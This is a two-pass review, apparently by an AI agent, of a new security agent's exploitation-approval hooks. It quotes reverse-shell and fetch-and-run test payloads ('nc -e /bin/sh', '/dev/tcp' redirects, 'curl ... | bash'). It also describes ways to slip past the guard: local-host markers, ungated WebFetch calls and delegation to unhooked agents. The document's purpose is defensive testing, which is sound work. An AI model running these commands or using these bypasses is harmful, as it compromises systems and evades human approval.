# security-expert (new agent) — Review

> **Status:** active · **Owner:** `analyst` · **Tracks:** K-016 (cobb backlog) — `claude/docs/plans/security-expert-coordination.md`

## Scope & verdict

Reviewed the new `security-expert` agent built by `cobb` against `claude/docs/requirements/security-expert.md`
(Status: Ready for design, `tico` interview confirmed 2026-08-17, FR-1..FR-11): the agent source
(`claude/security-expert/security-expert.md`), both PreToolUse hooks
(`hooks/guard-review-doc-writes.sh`, `hooks/guard-exploitation-approval.sh`) and their shared
cores (`claude/scripts/guard-doc-writes.sh`, `claude/scripts/guard-destructive-ops.sh`), the
agent's `kaizen/{plan,history}.md`, the catalog/roster edits (`claude/README.md`,
`claude/AGENTS.md`), `claude/scripts/audit-team.sh`'s new `BOUNDARY_PAIRS` entries, the reciprocal
boundary-clause edits in `claude/analyst/analyst.md`, `claude/cobb/cobb.md`, `claude/devops/devops.md`,
`claude/teco/teco.md`, and `claude/cobb/kaizen/history.md`'s K-016 closure entry. Baseline: `git diff`
against the working tree (not a description of it), the requirements doc's own FR/AC/decision-log
text, and this repo's `AGENTS.md` doc-convention/hook-machinery rules. Verified by running the
scripts myself: `bash -n` on both hooks, ~20 direct hook invocations with synthetic
`tool_input.command` payloads covering benign/positive/negative cases, and a full
`bash claude/scripts/audit-team.sh` run (110 PASS / 2 pre-existing FAIL, confirmed identical to
and out of scope per `cobb`'s report — both hits are the same already-tracked personal-info leak
in `falkor-chat/docs/test-reports/graphrag-eval-report.md`, committed 2026-08-16, untouched by
this session).

**Verdict: approve with suggestions.** No blocker. The requirements mapping (FR-1 through FR-11),
tool/hook scoping, catalog/roster/boundary-clause edits, and `cobb`'s own self-edit to `cobb.md`
are all accurate and grounded. Two **major** findings, both inside the FR-10 exploitation gate —
the one genuinely novel, high-stakes capability on this team — where the implementation doesn't
yet live up to a promise the design itself makes explicitly. Neither blocks acceptance because the
design's own stated primary control (prompt-level discipline) is unaffected by either gap and the
agent already carries a first-use kaizen item (K-002) to revisit the pattern catalog; both are
concrete and cheap enough to fix now rather than defer.

**CPG:** not applicable — this review's artifact is agent prompts, hook scripts, and Markdown
docs under `claude/`; there is no CPG for that content and none of the four review lenses this
change adds are themselves being exercised here (this is a review *of* the security-expert
agent's design, not a security-expert-style review performed *by* it).

## Findings

### Major — FR-10's `nc`/`ncat`/`netcat` reverse-shell flags slip past the exploitation guard when a local marker is present

`claude/security-expert/hooks/guard-exploitation-approval.sh:93-95` folds `nc`/`ncat`/`netcat`
into the generic `NETCLIENT` set and exempts any command carrying a local/dev marker
(`localhost`/`127.0.0.1`/`::1`/`0.0.0.0`/`host.docker.internal`) from escalation. But `nc -e`
(and the `ncat`/`netcat` equivalents) is a standard reverse-shell **client** invocation, not
merely an investigative network probe — and it is exactly the shape of command FR-10 exists to
gate ("every single attempt," local/dev targets *included*, no exception for locality). Verified
directly against the hook:

```
$ printf '{"tool_input":{"command":"nc -e /bin/sh 127.0.0.1 4444"}}' | bash guard-exploitation-approval.sh
(exit 0, no escalation)
$ printf '{"tool_input":{"command":"nc 127.0.0.1 4444 -e /bin/bash"}}' | bash guard-exploitation-approval.sh
(exit 0, no escalation)
```

This directly contradicts the hook's own header comment, which cites `nmap` against
`host.docker.internal` as proof the design already handles "ask even against a local marker,
correct, since FR-10 requires approval every time regardless of target" — that principle is
implemented for the `TOOLS` and `LISTENER` branches (regex-anchored, unconditional) but **not**
for `nc`/`ncat`/`netcat` specifically, because they were folded into the marker-exempt `NETCLIENT`
branch instead. The tool family that most commonly *is* the exploitation payload (reverse shells)
ends up in the branch designed for merely investigative traffic (curl/wget/ssh housekeeping).

**Suggested improvement:** give `nc`/`ncat`/`netcat` a dedicated, unconditional branch — mirroring
`LISTENER`'s "always ask" treatment — matching the `-e`/`-c` shell-spawn flags (and, if cheap,
`>&`/`/dev/tcp` piping into these tools) regardless of local marker, rather than relying on the
marker-exempt `NETCLIENT` catch-all for this tool family. Leave `curl`/`wget`/`ssh`/`telnet` in
the marker-exempt branch as-is — those are legitimately ambiguous between investigation and
exploitation and the existing design already treats that ambiguity correctly.

### Major — FR-10's approval ritual is written and gated Bash-only, but `WebFetch` is also in the agent's toolset

The frontmatter wires the exploitation-approval hook to `matcher: Bash` only
(`security-expert.md:12-15`), and the prompt's entire FR-10 section
(`security-expert.md:52-59`) is written exclusively in Bash terms — "issuing any command,"
"Bash calls," "every other Bash use... is unaffected by this gate." But the same frontmatter's
`tools:` line (`security-expert.md:4`) grants `WebFetch`, which is fully capable of carrying a
GET-based exploitation-shaped probe (a reflected-XSS/SQLi/path-traversal/SSRF payload embedded in
a query string) against a locally-running `salesperson`/`falkor-chat` instance — exactly the kind
of "proof it's exploitable, not just theoretical" activity FR-10 exists to gate. Neither the
harness backstop nor, more importantly, the **primary control** (the agent's own prompt-level
discipline, which is the part the design explicitly says "actually carries FR-10") currently says
anything about a `WebFetch` call against a live target needing the same "state target, technique,
blast radius, wait" ritual as a Bash call does. This is a gap in the design's stated primary
control, not just its backstop.

**Suggested improvement:** widen the FR-10 prompt language in `security-expert.md`'s "Active
exploitation" section to explicitly cover any tool call that reaches a live target — name
`WebFetch` alongside Bash — so the ritual isn't accidentally scoped to "commands" when the
agent's actual toolset includes a non-Bash way to probe a running system. Extending the harness
hook to also watch `WebFetch` calls is a reasonable follow-up but secondary to fixing the prompt,
since the prompt is the documented primary control.

### Major — plain investigative greps for `curl`/`wget`/`ssh` trip the exploitation guard, contradicting the "ordinary Bash use is unaffected" claim

`guard-exploitation-approval.sh`'s `NETCLIENT` match scans the whole command string for the tool
name anywhere, including inside a quoted grep pattern. Verified:

```
$ printf '{"tool_input":{"command":"grep -rn \"curl\" devops/scripts/"}}' | bash guard-exploitation-approval.sh
→ escalates ("network-reaching command with no visible local/dev marker...")
$ printf '{"tool_input":{"command":"cat app.py | grep wget"}}' | bash guard-exploitation-approval.sh
→ escalates
```

Grepping a codebase for `curl`/`wget`/`ssh` calls is completely ordinary FR-1/FR-3/FR-4
investigation — exactly the kind of secrets/infra-hardening or code-security search this agent is
expected to run constantly (e.g. hunting for a hardcoded `curl ... | bash` pipe, or an insecure
`ssh` invocation in a devops script). `security-expert.md:59` states plainly: "Every other Bash
use (FR-1 through FR-5's investigation, reading, running existing suites) is unaffected by this
gate and needs no special ceremony" — that claim is false for this common case, verified. The
practical risk isn't just friction: repeatedly asking a human to approve what is obviously a
benign grep, on the one gate in this team explicitly designed around "never standing consent,"
trains reflexive approval and quietly erodes the thing FR-10 exists to protect.

**Suggested improvement:** anchor the `NETCLIENT` match on the tool name appearing as an actual
command verb (start of command or after a shell separator: `;`, `&&`, `||`, `|`, backtick,
`$(`) rather than anywhere in the string, so a tool name inside a quoted search pattern or
grep/rg argument doesn't trip it — the same anchoring discipline `guard-destructive-ops.sh`'s
`pipeline.sh --reset` branch already uses (comment there explicitly accepts the residual
false-positive on a `grep '...pipeline.sh --reset...'` search as a known, accepted trade-off, but
that branch is a much narrower, one-off match; `curl`/`wget`/`ssh` are far higher-frequency search
terms for this agent's actual job than `pipeline.sh` is for `devops`/`graph-dba`/`qa-engineer`'s).

### Minor — `Agent`-tool delegation is a structural, but pre-existing and team-wide, bypass of every hook-gated agent's guard

`security-expert` carries the `Agent` tool (`security-expert.md:4`), so it could in principle
delegate an exploitation-shaped Bash command to a spawned agent whose own hook profile carries no
`guard-exploitation-approval.sh` (e.g. `coder`, `general-purpose`), sidestepping FR-10's harness
backstop entirely — the guard is wired per-agent, not per-action. This is real, but **not new to
this change**: `devops`, `graph-dba`, and `qa-engineer` declare no `tools:` allowlist at all
(checked: `grep -n '^tools:'` finds nothing in any of their `.md` files), so they inherit `Agent`
by default too, and carry the identical structural gap for their own `GRAPH.DELETE`/`FLUSHALL`
guards today. `cobb` gave `security-expert` the same tool shape as its closest sibling, `analyst`
(also `Agent`-equipped) — a reasonable, convention-following choice, not an oversight specific to
this design. Flagging as a cross-cutting open question for the team (a candidate for a future
`kaizen_team` entry or a `cobb`-led team-wide look at per-agent vs. per-action hook scoping) rather
than a defect in this deliverable.

### Minor — `skills/cpg-analysis/SKILL.md`'s own consumer list wasn't updated

`skills/cpg-analysis/SKILL.md`'s frontmatter `description` still enumerates only "analyst,
architect, qa-engineer, coder, tdd-engineer, or frontend-engineer" as the skill's consumers
(confirmed untouched by this change: `git log -1` on the file predates this session). FR-2 makes
`security-expert` a new, explicit consumer of this exact skill, and `security-expert.md:29`
correctly links and describes using it — but the skill's own self-description is now stale. Not a
functional blocker (the prompt links the skill file directly by path, so on-demand access works
regardless of the skill's self-description, and nothing gates access by that enumerated list), but
worth a follow-up edit for documentation currency.

**Suggested improvement:** add `security-expert` to `skills/cpg-analysis/SKILL.md`'s
`description` consumer list in a small follow-up change.

## What's solid

- **Grounding is accurate throughout.** Every specific claim checked against the real file traced
  correctly: the `CPG:` three-value convention cites `docs/plans/cpg-agent-adoption.md` §3
  correctly (verified the section exists with the exact three variants quoted); the closed
  doc-role set (`(none)` · `-coordination` · `-ml` · `-graph` · `-rca` · `-impl` · `-report`) is
  quoted correctly from root `AGENTS.md`; the FR-12/AC-9 "no `inbox.md` for a new agent" rule is
  applied correctly (confirmed: no `inbox.md` under `claude/security-expert/`).
- **FR-1 through FR-9's advisory boundaries are all correctly wired and non-overreaching.** The
  reciprocal clauses in `analyst.md`, `cobb.md`, and `devops.md` are short, accurate, and match
  the requirements doc's decision log exactly — including `cobb`'s **self-edit** to its own
  `cobb.md` (the specific item this brief asked to double-check): it states only that
  `security-expert` supplies an advisory opinion `cobb` weighs while keeping final authority,
  which is exactly FR-8's boundary and claims nothing more.
- **FR-7 (no standing gate) confirmed clean by direct sweep.** `security-expert` appears nowhere
  in any other agent's hooks, in `skills/agent-maintenance`/`agent-standards`, or in any workflow
  description as an automatic step — every reference found is either the catalog/roster or an
  explicit-invocation routing entry in `teco.md`.
- **Boundary-pair scoping (`analyst`/`cobb`/`devops`, not `qa-engineer`) matches the requirements
  doc exactly** — FR-6/FR-8/FR-9 name those three relationships and no others; the parking-lot
  note in `security-expert/kaizen/plan.md` correctly defers a `qa-engineer` pair rather than
  inventing one unrequested.
- **`audit-team.sh` re-run independently confirms `cobb`'s reported 110 PASS / 2 pre-existing
  FAIL exactly** — same two hits, same file, same pre-existing-and-unrelated status.
- **Tool/hook scoping is correct and non-over-granting.** `mcp__cypher__query` is present for
  FR-2 (required, since this agent declares an allowlist); `Bash` is present for FR-10; `Write`/
  `Edit` are hook-scoped to `docs/reviews/*` only, matching `analyst`'s own pattern exactly (no
  kaizen-inbox glob needed, correctly, since this agent has none).
- **The no-new-`-security`-role decision (checked item 3) is a reasonable, well-reasoned,
  explicitly-logged trade-off** — a repo scan of every `docs/reviews/` directory found zero
  existing `security-expert` reviews today, so there is no live collision, and the decision
  document already commits to revisiting via a `tico` interview if real friction emerges.

## Open questions

- The naming-collision safeguard for FR-11's review-doc path (item 3 in the brief) currently
  relies entirely on prompt-level slug discipline plus the generic Write-tool's forced
  read-before-overwrite on an existing file — there is no deterministic `audit-team.sh`-style
  check that would catch a future `analyst` and `security-expert` review silently landing on the
  same `docs/reviews/<slug>.md` path for the same artifact. Given zero current collisions, this
  doesn't block acceptance, but it's worth a stakeholder decision on whether a lightweight
  structural check (e.g. both agents `Glob`-checking the target directory for an existing review
  of the same topic before writing) is worth adding now versus waiting for real friction, as
  `cobb`'s own kaizen plan already proposes.
- The `Agent`-tool delegation bypass (minor finding above) is real but repo-wide and predates this
  change — is it worth a dedicated cross-cutting kaizen item now that a second high-stakes
  approval gate (FR-10, alongside the existing destructive-ops gates) depends on it not being
  exploited, or should it stay parked until a concrete incident motivates it?

## Pass 2 — 2026-08-21 — focused re-check of `cobb`'s fix pass

Scope: not a full re-review — a targeted verification that the three **major** findings and the
one cheap **minor** finding from Pass 1 are actually fixed, using my exact original reproduction
commands, plus a regression check that nothing else broke. Baseline: `git diff`/`git status`
against the working tree myself (`claude/security-expert/` is untracked — a brand-new agent, so
`git diff` shows nothing for it regardless of edits; compared current file contents directly
against what I read in Pass 1 instead), not `cobb`'s report of the diff.

**Verdict: approve.** All three majors and the minor are genuinely fixed, verified by re-running
my own repro commands against the live hook script, not by reading `cobb`'s description of the
fix. No regression found in a broader sweep (all Pass-1 benign/escalate cases re-run, plus new
edge cases probing the fix itself). The one deferred item (extending the harness hook to
`WebFetch`, tracked as new `K-004`) is disclosed openly rather than silently dropped, and is an
acceptable disposition — see below.

### 1. `nc`/`ncat`/`netcat` reverse-shell bypass — fixed, verified

`claude/security-expert/hooks/guard-exploitation-approval.sh` now carries two new **unconditional**
branches (no local-marker exemption): (c) `nc`/`ncat`/`netcat` with a shell-spawn flag
(`-e`/`-c`/`--exec`/`--sh-exec`), and (d) a `/dev/tcp` + `>&`/`<&` redirect (the nc-less bash
reverse-shell technique — a bonus fix beyond what I asked for). `nc`/`ncat`/`netcat` were removed
from the marker-exempt `NETCLIENT` set entirely. Re-ran my exact Pass-1 repros directly against
the hook:

```
$ printf '{"tool_input":{"command":"nc -e /bin/sh 127.0.0.1 4444"}}' | bash guard-exploitation-approval.sh
→ ASKs: "nc/ncat/netcat with a shell-spawn flag ... regardless of a local marker"
$ printf '{"tool_input":{"command":"nc 127.0.0.1 4444 -e /bin/bash"}}' | bash guard-exploitation-approval.sh
→ ASKs, same reason
```

Both now escalate. Also re-tested the general shell-native technique I'd noted in Pass 1 as a
fundamental pattern-matching limitation (not part of the three majors, since no named tool is
involved): `bash -i >& /dev/tcp/127.0.0.1/4444 0>&1` now escalates too, via the new branch (d) —
an improvement beyond what was asked.

### 2. FR-10 Bash-only prompt gap — fixed, verified, and honestly scoped

`security-expert.md`'s "Active exploitation (FR-10)" section now explicitly states (line 56):
"The ritual below covers every tool call that reaches a live target, not just Bash... your
`tools:` also grants `WebFetch`, which is fully capable of carrying a GET-based exploitation
probe... Treat any `WebFetch` call whose target is a live system the same as a Bash exploitation
attempt." The "fresh, explicit approval" bullet (line 58) and the Guardrails section (line 87)
were updated in parallel ("Bash and WebFetch are for investigation and, only under FR-10's gate,
exploitation... FR-10's approval ritual applies to both tools equally"). This is not vague —
it's a direct, specific instruction naming the tool and the reasoning.

`cobb`'s disclosure that the harness hook itself is *not* extended to watch `WebFetch` is accurate
and not silently dropped: line 59 states plainly "Harness backstop, not the primary control — and
Bash-only today... It does **not** watch `WebFetch` calls (a tracked follow-up, not yet built —
`security-expert/kaizen/plan.md`)." Checked `kaizen/plan.md`: `K-004` (medium priority, added
2026-08-20) exists and accurately describes the gap and why it's deferred ("genuinely harder to
pattern-match reliably than a Bash command, so scope it carefully rather than rushing a noisy
first cut"). **This disposition is acceptable** — it matches my own Pass-1 framing exactly
("secondary to the prompt fix," since the prompt is the documented *primary* control for FR-10 and
that part is fixed), the gap is openly disclosed in the prompt itself rather than hidden, and it's
tracked as a real backlog item rather than dropped.

### 3. Benign `curl`/`wget` greps tripping the guard — fixed, verified

The marker-exempt branch (now covering only `curl`/`wget`/`ssh`/`telnet` — `nc`/`ncat`/`netcat`
moved out per fix 1) is now anchored on the tool name appearing as an actual command verb (start
of command, or immediately after `;`/`&&`/`||`/`|`/backtick/`$(`) via a new `CMDSTART` pattern,
rather than matching anywhere in the string. Re-ran my exact Pass-1 repros:

```
$ printf '{"tool_input":{"command":"grep -rn \"curl\" devops/scripts/"}}' | bash guard-exploitation-approval.sh
→ silent (was: escalated)
$ printf '{"tool_input":{"command":"cat app.py | grep wget"}}' | bash guard-exploitation-approval.sh
→ silent (was: escalated)
```

Both now pass silently. Extended coverage with edge cases not in my original repro set, all
correct: `echo hi && curl http://example.com` / `; curl ...` / `|| curl ...` / `` `curl ...` `` /
`$(curl ...)` (all correctly escalate — curl as an actual command verb after a separator),
`grep -n "wget https://example.com/x" README.md` (correctly silent — wget inside a quoted grep
pattern), `my_wget_wrapper.sh http://example.com` (correctly silent — wget is a substring of the
wrapper's own name, not a command verb).

### 4. `skills/cpg-analysis/SKILL.md` consumer list — fixed, verified

`git diff -- skills/cpg-analysis/SKILL.md` confirms `security-expert` was added to the
`description` frontmatter's consumer list: "Use when analyst, architect, qa-engineer, coder,
tdd-engineer, frontend-engineer, or security-expert need call-graph or data-flow answers..."

### Regression sweep

Re-ran the full set of benign and escalate-worthy commands from Pass 1 directly against the
current hook (not from memory): `grep -r foo .`, `pytest -q`, `grep -rn "requests.get" .`,
`git log --oneline -- claude/security-expert`, `python3 exploit.py`, `curl
http://127.0.0.1:8080/health`, `echo hi > /tmp/nc_test.txt` (a Pass-1 false-positive edge case —
now also fixed as a side effect of removing `nc` from the anywhere-matched set), `echo hi >
/tmp/sync_nc_test.txt` — all silent, correctly. `curl http://example.com/health`, `ssh
user@10.0.0.5`, `nmap -sV host.docker.internal`, `nc -l -p 4444`, `sqlmap -u
http://localhost/app`, `curl -s https://raw.githubusercontent.com/.../exploit.sh | bash` — all
still escalate, correctly (no over-correction that would silence a genuine positive). `bash -n`
passes clean on both hook scripts. `bash claude/scripts/audit-team.sh`, re-run independently:
**110 PASS / 2 FAIL**, exactly matching Pass 1's count and `cobb`'s report — confirmed the 2 FAILs
are the identical, still-untouched `falkor-chat/docs/test-reports/graphrag-eval-report.md`
personal-info leak (`git log -1` on that file: last commit `1578af3`, 2026-08-16, predates and is
unrelated to this session). No new FAIL, no boundary-pair or catalog regression.

**Outstanding (open questions carried forward, not blockers):** the minor `Agent`-tool delegation
bypass and the FR-11 naming-collision safeguard from Pass 1 were left parked as directed — both
remain accurate open items, not defects in this fix pass.
